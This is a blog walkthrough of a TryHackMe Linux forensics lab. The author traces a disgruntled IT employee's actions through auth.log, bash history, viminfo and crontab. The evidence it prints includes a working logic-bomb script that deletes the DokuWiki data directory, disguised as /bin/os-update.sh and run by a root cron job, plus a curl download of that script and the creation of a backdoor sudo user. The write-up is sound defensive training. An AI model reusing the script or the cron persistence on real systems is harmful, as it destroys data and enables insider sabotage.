---
title: "[SOC-Level 1] Tryhackme - Linux Forensics - Disgruntled"
date: 2024-11-21 12:00:00 -500 
categories: [SOC-Level 1 - Tryhackme, Linux Forensics - Disgruntled]
tags: [soc,tryhackme,blueteam,linux,forensics]
author: Christoph K
---
[TryHackMe- Disgruntled ](https://tryhackme.com/r/room/disgruntled)





### Introduction


        Hey, kid! Good, you’re here!

        Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

        CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.




![Cheatsheet](assets/img/tryhackme/disgruntled/cheatsheet.png)

## Task 1: Nothing suspicious .... so far

        Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.

        My advice: Look at the privileged commands that were run. That should get you started.



- The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
- What was the present working directory (PWD) when the previous command was run?


### Task 1.1 The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

We have several options to find out which command was used for installing a package with elevated privileges. I used `auth.log` to find the correct command.

```bash

root@ip-10-10-26-7:/home/cybert# cat /var/log/auth.log |grep install
Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
Dec 28 06:20:55 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /usr/share/dokuwiki/VERSION /usr/share/dokuwiki/bin /usr/share/dokuwiki/doku.php /usr/share/dokuwiki/feed.php /usr/share/dokuwiki/inc /usr/share/dokuwiki/index.php /usr/share/dokuwiki/install.php /usr/share/dokuwiki/lib /usr/share/dokuwiki/vendor -R
root@ip-10-10-26-7:/home/cybert#
```

As you can see, the user `cybert` used `root` privilges to install `dokuwiki`-

Answer: `/usr/bin/apt install dokuwiki`


### Task 1.2 What was the present working directory (PWD) when the previous command was run?

We can see the answer also in the `auth.log`: 
`PWD=/home/cybert `


Answer: `/home/cybert`



## Task 2: Let's see if you did anyhting bad

        Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.

- Which user was created after the package from the previous task was installed?
- A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
- A script file was opened using the "vi" text editor. What is the name of this file?


### Task 2.1 Which user was created after the package from the previous task was installed?

Lets check the `.bash_history` in the profile `cybert`:


```bash
root@ip-10-10-26-7:/home/cybert# sudo cat .bash_history

exit
sudo apt install dokuwiki
sudo rm /var/lib/dpkg/lock
sudo dpkg --configure -a
sudo lsof /var/lib/dpkg/lock
sudo lsof /var/lib/dpkg/lock-frontend
sudo rm /var/lib/dpkg/lock-frontend
sudo dpkg --configure -a
sudo apt install dokuwiki
chown www-data:www-data /usr/share/dokuwiki
sudo chown www-data:www-data /usr/share/dokuwiki
chown www-data:www-data /usr/share/dokuwiki/* -R
sudo chown www-data:www-data /usr/share/dokuwiki/* -R
chown www-data:www-data /var/lib/dokuwiki
sudo chown www-data:www-data /var/lib/dokuwiki
chown www-data:www-data /var/lib/dokuwiki/* -R
sudo chown www-data:www-data /var/lib/dokuwiki/* -R
ln -s /var/lib/dokuwiki/data /usr/share/dokuwiki/data
sudo ln -s /var/lib/dokuwiki/data /usr/share/dokuwiki/data
ln -s /etc/dokuwiki/license.php /usr/share/dokuwiki/conf/license.php
sudo ln -s /etc/dokuwiki/license.php /usr/share/dokuwiki/conf/license.php
nano /etc/apache2/sites-available/dokuwiki.conf
sudo nano /etc/apache2/sites-available/dokuwiki.conf
a2ensite dokuwiki
sudo a2ensite dokuwiki
systemctl reload apache2
sudo systemctl reload apache2
sudo adduser it-admin
sudo visudo
su it-admin
exit
sudo passwd root
su root
exit
su root
nano /etc/ssh/sshd_config
sudo nano /etc/ssh/sshd_config
service sshd restart
sudo service sshd restart
su root
exit
```

As we can see, `cybert` created `it-admin` with the command: `sudo adduser it-admin`


Answer: `it-admin`

### Task 2.2 A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

We can search the `auth.log` for `visudo` to find out the time and date for that. 



```
root@ip-10-10-26-7:/home/cybert# cat /var/log/auth.log |grep visudo
Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo

```
We get 2 results, one of them from `user cybert`.

Answer: `Dec 28 06:27:34`


### Task 2.3 A script file was opened using the "vi" text editor. What is the name of this file?

We just have to continue to search the `auth.log`. We can either search for `|grep -i "vi" ` or we can search for `scripts` with `|grep -i "*.sh"`

``` bash
Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/usr/bin/vi bomb.sh
```
That looks like a suspicious script :-) 

Answer: `bomb.sh`

## Task 3: Bomb has been planted. But when and where?


        That bomb.sh file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.

- What is the command used that created the file bomb.sh?
- The file was renamed and moved to a different directory. What is the full path of this file now?
- When was the file from the previous question last modified? (Format: Month Day HH:MM)
- What is the name of the file that will get created when the file from the first question executes?


### Task 3.1 What is the command used that created the file bomb.sh?

We know from the previous question, that the directory was  `PWD=/home/it-admin/`. So lets switch into that profile and check the `.bash_histoy`:

```bash


root@ip-10-10-26-7:/home/it-admin# sudo cat .bash_history
whoami
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
ls
ls -la
cd ~/
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
```


Answer: `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

### Task 3.2 The file was renamed and moved to a different directory. What is the full path of this file now?

Now we have to check the `vim-history`. We use `.viminfo` in the `it-admin` profile:


```bash
root@ip-10-10-26-7:/home/it-admin# cat .viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
|2,0,1672208992,,"q!"
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"
```


Answer: `/bin/os-update.sh`


### Task 3.3 When was the file from the previous question last modified? (Format: Month Day HH:MM)

This is not difficult - we can use the `ls -l` command to display permssions, date of creation and modification:
We know from last question, that the file was placed in `/bin/os-update.sh`

```bash
root@ip-10-10-26-7:/home/it-admin# ls -la /bin |grep os-update
-rw-r--r--  1 root root     325 Dec 28 06:29  2022 os-update.sh
```



Answer: `Dec 28 06:29 `


### Task 3.4 What is the name of the file that will get created when the file from the first question executes?

Lets have a look into the script `os-update.sh`:

```bash
root@ip-10-10-26-7:/home/it-admin# cat /bin/os-update.sh
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi
root@ip-10-10-26-7:/home/it-admin#
```
We can see, that the script creates after a defined time an output which goes into `goodbye.txt` via `>`.


Answer: ` goodbye.txt`

## Task 4 Following the fuse

        So we have a file and a motive. The question we now have is: how will this file be executed?

        Surely, he wants it to execute at some point?

- At what time will the malicious file trigger? (Format: HH:MM AM/PM)

### Task 4.1 At what time will the malicious file trigger? (Format: HH:MM AM/PM)

Lastly we check the `crontab` file when the script will be executed.

```bash

cat /etc/crontab

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
0 8     * * *   root    /bin/os-update.sh
```

We have `0 8     * * *   root    /bin/os-update.sh` which means 8:00 AM

- Minute (0): The job runs at the start of the hour.
- Hour (8): The job runs at 8:00 AM.
- Day of Month (*): Every day.
- Month (*): Every month.
- Day of Week (*): Every day of the week.

Answer: `08:00 AM`

## Thoughts:


Cool and easy beginner machine to get to know Linux Forensics. 

What did we learn? 
- using `.bash_history` for searching for used commands
- using `.viminfo` for checking changes made into a file
- using `auth.log` to fully understand what happened on the machine
- using `crontab` to check when the script gets executed